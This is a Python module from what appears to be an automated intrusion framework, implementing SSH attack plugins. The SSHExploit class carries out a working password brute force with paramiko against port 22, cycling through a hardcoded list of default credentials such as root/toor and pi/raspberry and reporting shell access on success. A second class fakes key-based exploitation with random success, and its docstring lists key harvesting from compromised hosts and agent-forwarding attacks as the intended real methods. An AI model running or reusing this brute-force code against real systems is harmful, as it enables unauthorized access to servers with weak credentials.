"""
SSH Exploitation Module
SSH brute force and key-based attacks
"""

import socket
import time
from typing import Dict, Tuple, Optional, List

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    logger.warning("paramiko not available, SSH exploit will be limited")


class SSHExploit(BaseExploit):
    """SSH brute force exploitation"""
    
    def __init__(self):
        super().__init__(
            name="SSH_BruteForce",
            target_ports=[22],
            target_os=["Linux", "Unix", "Unknown"]
        )
        self.max_attempts = 10
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if SSH is accessible"""
        return 22 in target.get('open_ports', [])
    
    def exploit(self, target: Dict) -> Tuple[bool, Optional[Dict]]:
        """
        Attempt SSH brute force
        
        Real implementation uses paramiko for actual SSH connections
        """
        ip = target['ip']
        
        logger.info(f"SSH: Attempting brute force on {ip}")
        
        if not PARAMIKO_AVAILABLE:
            # Simulate without paramiko
            return self._simulate_bruteforce(target)
        
        # Try common credentials
        credentials = self._get_common_credentials()
        
        for username, password in credentials[:self.max_attempts]:
            logger.debug(f"SSH: Trying {username}:{password} on {ip}")
            
            try:
                success = self._try_ssh_login(ip, username, password)
                
                if success:
                    logger.success(f"SSH: Valid credentials found - {username}:{password}")
                    
                    result = {
                        'method': 'SSH_BruteForce',
                        'username': username,
                        'password': password,
                        'access_level': 'User',
                        'shell_access': True
                    }
                    
                    return True, result
                
                # Small delay between attempts
                time.sleep(0.5)
                
            except Exception as e:
                logger.debug(f"SSH: Login attempt failed - {e}")
        
        return False, {'reason': 'no_valid_credentials'}
    
    def _try_ssh_login(self, ip: str, username: str, password: str, timeout: int = 5) -> bool:
        """
        Try SSH login with credentials
        
        Real implementation:
        """
        if not PARAMIKO_AVAILABLE:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=22,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            logger.debug(f"SSH connection error: {e}")
            return False
    
    def _simulate_bruteforce(self, target: Dict) -> Tuple[bool, Optional[Dict]]:
        """Simulate brute force when paramiko not available"""
        vuln_score = target.get('vulnerability_score', 0)
        
        # Simulate based on vulnerability score
        import random
        success = random.random() < (vuln_score / 200.0)  # 0-50% based on vuln score
        
        if success:
            result = {
                'method': 'SSH_BruteForce',
                'username': 'admin',
                'password': 'admin',
                'access_level': 'User',
                'shell_access': True
            }
            return True, result
        
        return False, {'reason': 'no_valid_credentials'}
    
    def _get_common_credentials(self) -> List[Tuple[str, str]]:
        """Get common SSH credentials"""
        return [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', 'password'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
            ('ubuntu', 'ubuntu'),
            ('pi', 'raspberry'),
            ('admin', '123456'),
            ('root', ''),
        ]


class SSHKeyExploit(BaseExploit):
    """SSH key-based exploitation"""
    
    def __init__(self):
        super().__init__(
            name="SSH_KeyExploit",
            target_ports=[22],
            target_os=["Linux", "Unix", "Unknown"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if SSH keys might be exploitable"""
        return 22 in target.get('open_ports', [])
    
    def exploit(self, target: Dict) -> Tuple[bool, Optional[Dict]]:
        """
        Attempt SSH key exploitation
        
        Real implementation would:
        - Try known weak/default SSH keys
        - Attempt key harvesting from other compromised hosts
        - Try SSH agent forwarding attacks
        """
        ip = target['ip']
        
        logger.info(f"SSH Key: Attempting key-based exploitation on {ip}")
        
        # Simulate key exploitation
        import random
        success = random.random() < 0.15  # 15% success rate
        
        if success:
            result = {
                'method': 'SSH_Key',
                'key_type': 'RSA',
                'access_level': 'User',
                'shell_access': True
            }
            return True, result
        
        return False, {'reason': 'no_valid_keys'}


if __name__ == "__main__":
    # Test SSH exploit
    exploit = SSHExploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [22, 80],
        'os_guess': 'Linux',
        'banners': {22: 'SSH-2.0-OpenSSH_7.4'},
        'vulnerability_score': 60
    }
    
    print(f"Testing {exploit.name}")
    print(f"Vulnerable: {exploit.check_vulnerable(test_target)}")
    
    success, result = exploit.exploit(test_target)
    print(f"Success: {success}")
    print(f"Result: {result}")
